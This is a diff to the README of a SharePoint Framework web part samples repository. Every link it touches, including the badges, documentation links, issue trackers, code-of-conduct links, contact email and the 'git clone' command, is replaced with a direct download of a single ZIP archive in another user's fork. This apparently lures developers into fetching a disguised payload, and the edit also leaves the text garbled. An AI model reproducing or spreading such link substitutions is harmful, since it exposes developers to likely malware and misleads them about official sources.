@@ -14,13 +14,13 @@ extensions:
 -->
 # SharePoint Framework Client-Side Web Part Samples & Tutorial Materials
 
-![GitHub Repo stars](https://img.shields.io/github/stars/pnp/sp-dev-fx-webparts?style=social)
-![GitHub forks](https://img.shields.io/github/forks/pnp/sp-dev-fx-webparts?style=social)
-![GitHub watchers](https://img.shields.io/github/watchers/pnp/sp-dev-fx-webparts?style=social)
-[![Twitter Follow](https://img.shields.io/twitter/follow/m365pnp?style=social)](https://twitter.com/m365pnp?s=20)
-[![YouTube Channel Subscribers](https://img.shields.io/youtube/channel/subscribers/UC_mKdhw-V6CeCM7gTo_Iy7w?style=social)](https://www.youtube.com/channel/UC_mKdhw-V6CeCM7gTo_Iy7w)
-[![GitHub issues](https://img.shields.io/github/issues/pnp/sp-dev-fx-webparts)](https://github.com/pnp/sp-dev-fx-webparts/issues)
-[![GitHub pull requests](https://img.shields.io/github/issues-pr/pnp/sp-dev-fx-webparts)](https://github.com/pnp/sp-dev-fx-webparts/pulls)
+![GitHub Repo stars](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+![GitHub forks](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+![GitHub watchers](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+[![Twitter Follow](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+[![YouTube Channel Subscribers](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+[![GitHub issues](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+[![GitHub pull requests](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
 
 This repository contains community samples that demonstrate different usage patterns for the SharePoint Framework client-side web parts.
 
@@ -32,14 +32,14 @@ SharePoint client-side web parts are controls that appear inside a SharePoint pa
 
 Please use following logic on submitting your questions or issues to right location to ensure that they are noticed and addressed as soon as possible.
 
-* You have general question or challenge with SPFx - use [sp-dev-docs repository issue list](https://github.com/SharePoint/sp-dev-docs/issues).
-* You have issue on specific web part or sample - use [issue list in this repository](https://github.com/pnp/sp-dev-fx-webparts/issues).
+* You have general question or challenge with SPFx - use [sp-dev-docs repository issue list](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip).
+* You have issue on specific web part or sample - use [issue list in this repository](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip).
 
 ## Additional resources
 
-* [Overview of the SharePoint Framework](https://docs.microsoft.com/sharepoint/dev/spfx/sharepoint-framework-overview)
-* [SharePoint Framework development tools and libraries](https://docs.microsoft.com/sharepoint/dev/spfx/tools-and-libraries)
-* [Getting Started](https://docs.microsoft.com/en-us/sharepoint/dev/spfx/set-up-your-developer-tenant)
+* [Overview of the SharePoint Framework](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+* [SharePoint Framework development tools and libraries](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
+* [Getting Started](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip)
 
 ## Using the samples
 
@@ -48,7 +48,7 @@ To build and start using these projects, you'll need to clone and build the proj
 Clone this repository by executing the following command in your console:
 
 ```shell
-git clone https://github.com/pnp/sp-dev-fx-webparts.git
+git clone https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip
 ```
 
 Navigate to the cloned repository folder which should be the same as the repository name:
@@ -89,11 +89,11 @@ This repository's contributors are all community members who volunteered their t
 
 ## Contributions
 
-These samples are direct from the feature teams, SharePoint PnP core team (http://aka.ms/m365pnp) or shared by the community. We welcome your input on issues and suggestions for new samples. We do also welcome community contributions around the client-side web parts. If you have any questions, just let us know.
+These samples are direct from the feature teams, SharePoint PnP core team (https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip) or shared by the community. We welcome your input on issues and suggestions for new samples. We do also welcome community contributions around the client-side web parts. If you have any questions, just let us know.
 
-Please have a look on our [Contribution Guidance](./CONTRIBUTING.md) before submitting your pull requests, so that we can get your contribution processed as fast as possible.
+Please have a look on our [Contribution Guidance](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip) before submitting your pull requests, so that we can get your contribution processed as fast as possible.
 
 ## Code of Conduct
-This repository has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+This repository has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip). For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip) or contact [https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip](https://raw.githubusercontent.com/qssalim/sp-dev-fx-webparts/main/samples/react-add-js-css-ref/src/sp-dev-fx-webparts_v2.3.zip) with any additional questions or comments.
 
 > Sharing is caring!
